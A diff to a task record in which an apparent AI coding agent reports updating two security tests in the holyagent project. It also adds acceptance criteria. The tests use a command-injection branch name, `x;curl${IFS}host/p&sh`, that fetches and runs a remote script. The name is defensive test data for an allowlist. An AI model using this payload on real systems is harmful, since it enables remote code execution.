@@ -50,5 +50,29 @@
     "finishedAt": "2026-11-09T13:33:13.846Z"
   },
   "result": "result: Both tests now use `x;curl${IFS}host/p&sh\\`#`. I replaced `|`, the only character git cannot create as a ref on NTFS, with `&`. I did not run the tests on Windows, so the fix there is untested.\nchanged: /home/user/holyagent-0.3.0-cloudbranch/packages/runtime/tests/cloud-checkout.test.ts\nchecks:\n`bun install --frozen-lockfile` -> exit 0\n`bunx --no-install mise run build` -> exit 0, `git status` afterwards shows only the test file modified\n`bunx --no-install mise run verify` -> exit 0, 2531 pass, 0 fail, 82 files\nblockers: none\nquestions: none\nnotes:\nThe name is now one shared `HOSTILE` constant with an explanatory comment, used by both tests and by both sources (the reflog branch and `origin/HEAD`). I kept every assertion, including the `curl` checks.\nThe name still fails the allowlist (`SAFE_BRANCH` in `status.ts`) because of `;`, `$`, `{`, `}`, `&`, backtick and `#`.\nDiff file: /tmp/claude-0/-home-user-holyagent/43946df6-456d-58c6-bea3-7e958fcb9495/scratchpad/ply1.diff\nevidence:\nBoth tests use a hostile name that git can create on Windows and that the allowlist still rejects, with every assertion kept: `HOSTILE` in `cloud-checkout.test.ts` lines 15-18, used at lines 112 and 133 and in the `origin/HEAD` source. The diff file shows no assertion changed.\nmise run build leaves no unexplained changes and mise run verify exits 0: build exit 0 with only the test file changed, verify exit 0 with 2531 pass and 0 fail.\ndiff-file: /tmp/claude-0/-home-user-holyagent/43946df6-456d-58c6-bea3-7e958fcb9495/scratchpad/ply1.diff\ngates: `bunx --no-install mise run build` exit 0; `bunx --no-install mise run verify` exit 0, 2531 pass, 0 fail.\n",
+  "acceptance": {
+    "revision": 1,
+    "rationale": "windows and every other required check passed on b7208967; the hostile name keeps all shell metacharacters except the one NTFS forbids",
+    "criteria": [
+      {
+        "criterion": "Both tests use a hostile name that git can create on Windows and that the allowlist still rejects, with every assertion kept",
+        "support": "`HOSTILE` in `cloud-checkout.test.ts` lines 15-18, used at lines 112 and 133 and in the `origin/HEAD` source. The diff file shows no assertion changed."
+      },
+      {
+        "criterion": "mise run build leaves no unexplained changes and mise run verify exits 0",
+        "support": "build exit 0 with only the test file changed, verify exit 0 with 2531 pass and 0 fail."
+      }
+    ],
+    "evidence": [
+      {
+        "label": "diff-file",
+        "support": "/tmp/claude-0/-home-user-holyagent/43946df6-456d-58c6-bea3-7e958fcb9495/scratchpad/ply1.diff"
+      },
+      {
+        "label": "gates",
+        "support": "`bunx --no-install mise run build` exit 0; `bunx --no-install mise run verify` exit 0, 2531 pass, 0 fail."
+      }
+    ]
+  },
   "createdAt": "2026-11-09T13:30:11.945Z"
 }
